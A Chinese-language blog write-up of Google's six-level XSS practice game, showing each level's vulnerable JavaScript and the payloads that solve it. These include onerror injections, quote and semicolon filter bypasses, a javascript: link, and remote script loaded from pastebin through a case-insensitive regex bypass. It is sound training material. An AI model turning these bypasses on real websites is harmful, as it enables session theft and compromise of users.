---
title: "Google XSS Game Note"
layout: post
date: 2016-11-24 22:00
headerImage: false
tag:
- XSS
blog: true
star: false
author: b1ngz
description: Google XSS Game Note
---



**Update:**

**12.26:**  纠正 level2 插入中`<script>` 标签没有执行的原因

# 简介
---
做了下google的 [XSS game](https://xss-game.appspot.com)，一共6题，挺好玩的，这里记录一下过程

# 解题
---

## level 1
---

搜索框没有过滤，服务端直接把用户的输入输出到 HTML 响应中

payload `<script>alert(1)</script>` 

点击 Search 触发弹框


## level 2
---

DOM型 XSS, 问题代码 game.js 


```javascript
function setInnerText(element, value) {
  if (element.innerText) {
    element.innerText = value;
  } else {
    element.textContent = value;
  }
}
```

输入 `<script>alert(1)</script>` 点击 `Share status`, 查看源码，可以看到 `<script>` 标签被插入到 dom 中，但是没有执行，**之前理解错误**，以为 `<script>` 标签只有在页面被载入的时候才会执行，其实是因为代码中通过 `innerText` 的方式来插入，浏览器不会加载和执行脚本，但如果通过创建标签，然后 `appendChild` 的方式是可以执行的

```
var script = document.createElement('script');
script.src = "https://pastebin.com/raw/CnjDaS8i";
document.getElementsByTagName('head')[0].appendChild(script);
```

这里可以使用 `<img src="x" onerror="alert(1)">` 来执行弹框


## level 3
---

XSS输出点在 标签属性值，注入点为 hash(#) 后的数字 

问题函数

```javascript
function chooseTab(num) {
  // Dynamically load the appropriate image.
  var html = "Image " + parseInt(num) + "<br>";
  html += "<img src='/static/level3/cloud" + num + ".jpg' />";
  $('#tabContent').html(html);

  window.location.hash = num;

  // Select the current tab
  var tabs = document.querySelectorAll('.tab');
  for (var i = 0; i < tabs.length; i++) {
    if (tabs[i].id == "tab" + parseInt(num)) {
      tabs[i].className = "tab active";
      } else {
      tabs[i].className = "tab";
    }
  }

  // Tell parent we've changed the tab
  top.postMessage(self.location.toString(), "*");
}

window.onload = function() { 
  chooseTab(self.location.hash.substr(1) || "1");
}

// Extra code so that we can communicate with the parent page
window.addEventListener("message", function(event){
  if (event.source == parent) {
    chooseTab(self.location.hash.substr(1));
  }
}, false);
```

关键代码，直接拼接用户输入，将其设置为 element 的 HTML content

```javascript
var html = "Image " + parseInt(num) + "<br>";
html += "<img src='/static/level3/cloud" + num + ".jpg' />";
$('#tabContent').html(html);
```


修改 `https://xss-game.appspot.com/level3/frame#1` 的 `1` 为 `testgoogle`，查找源码，找输出点为 `<img>` 标签的 `src` 属性

```html
<img src="/static/level3/cloudtestgoogle.jpg">
```

尝试用双引号闭合失败

```html
<img src="/static/level3/cloud&quot;.jpg">
```

单引号成功

```html
<img src="/static/level3/cloud" .jpg'="">
```

使用 `onerror` 函数弹框, pyload 为 `'onerror="alert(1)" '`

```html
<img src="/static/level3/cloud" onerror="alert(1)" '.jpg'="">
```


## level 4
---

XSS输出点在标签的事件属性值

输入 `123testgoogle`, 源码中查找输出点

```html
<img src="/static/loading.gif" onload="startTimer('123testgoogle');">
```

尝试双引号闭合失败，源码：

```html
<img src="/static/loading.gif" onload="startTimer('123testgoogle&quot;');">
```

这里注意到双引号被转成 HTML 实体编码 `&quot;`

使用单引号, 查看源码输出

```html
<img src="/static/loading.gif" onload="startTimer('123testgoogle&#39;');" />
```

单引号被转成了 实体编码 `&#39;`

当图片被加载时，会执行 `startTimer` 函数，此时查看 console，可以看到报语法错误

```
Uncaught SyntaxError: Invalid or unexpected token       VM8914 frame?timer=123testgoogle':21 
```

说明单引号起到了作用，使用审查元素，查看，可以看到两个 单引号`'` (浏览器对实体编码进行了decode)， 导致语法错误

```html
<img src="/static/loading.gif" onload="startTimer('1234testgoogle'');">
```

这里有一个知识点：**当浏览器解析标签属性时，会先对值进行 HTML实体编码进行 decode**，这也是为什么，源码中 `&#39;` 会起到作用的原因

因此，为了执行弹框，我们首先需要闭合函数，然后执行 `alert`，尝试使用payload 

```
1');alert('1
```

发现 `;alert('1` 被过滤了

```html
<img src="/static/loading.gif" onload="startTimer('1&#39;)');" />

```

使用 `1')alert('1` 得到结果

```html
<img src="/static/loading.gif" onload="startTimer('1&#39;)alert(&#39;1');" />
```
发现没有被过滤，说明使用分号 `;` 会被过滤了，这里使用 逗号 `,` 来绕过

```
1'),alert('1
```

成功弹框


## level 5
---

页面中 `Sign up` 和 `Next` 功能为简单页面跳转，没有什么作用。

这里注意到 url 中有一个参数 `confirm`

```
https://xss-game.appspot.com/level5/frame/signup?next=confirm
```

尝试修改 `testgoogle`，查看源码，找到输出点 

```html
<a href="testgoogle">Next &gt;&gt;</a>
```

href 可以使用 `javascript:` scheme 来执行 js 代码，payload

```
javascript:alert(1);
```

查看响应

```html
<a href="javascript:alert(1)">Next &gt;&gt;</a>
```

点击 `Next` link 触发弹框

总结：XSS输出位置在 `<a>` 标签的 `href` 属性中，注入点在url参数，需要点击触发


# level 6
---

页面没有输入的地方，通过分析 `frame` 页面源码，得到页面载入时会 会执行`includeGadget` 函数，截取 url 中 hash 作为 `<script>` 标签的 `src`，然后将其插入到 head 中

```javascript
function includeGadget(url) {
  var scriptEl = document.createElement('script');

  // This will totally prevent us from loading evil URLs!
  if (url.match(/^https?:\/\//)) {
    setInnerText(document.getElementById("log"),
      "Sorry, cannot load a URL containing \"http\".");
    return;
  }

  // Load this awesome gadget
  scriptEl.src = url;

  // Show log messages
  scriptEl.onload = function() { 
    setInnerText(document.getElementById("log"),  
      "Loaded gadget from " + url);
  }
  scriptEl.onerror = function() { 
    setInnerText(document.getElementById("log"),  
      "Couldn't load gadget from " + url);
  }

  document.head.appendChild(scriptEl);
}

 // Take the value after # and use it as the gadget filename.
function getGadgetName() { 
  return window.location.hash.substr(1) || "/static/gadget.js";
}

includeGadget(getGadgetName());

```

这里可以通过修改 hash, 让其加载外部的js文件，这里需要注意的是，因为站点是 https 的，所以只能加载 https 的资源，且js代码中会资源url进行了限制

```javascript
if (url.match(/^https?:\/\//)) {
        setInnerText(document.getElementById("log"),
          "Sorry, cannot load a URL containing \"http\".");
        return;
}
```

但是正则忽略了大小写问题，使用 `Https` 即可绕过。

这里使用 [pastebin](https://pastebin.com) 来存储外部js

payload

```
https://xss-game.appspot.com/level6/frame#Https://pastebin.com/raw/XYc57a0A
```

成功弹框


# 参考
---
- [google Cross-site scripting learning](https://www.google.com/about/appsecurity/learning/xss/index.html)




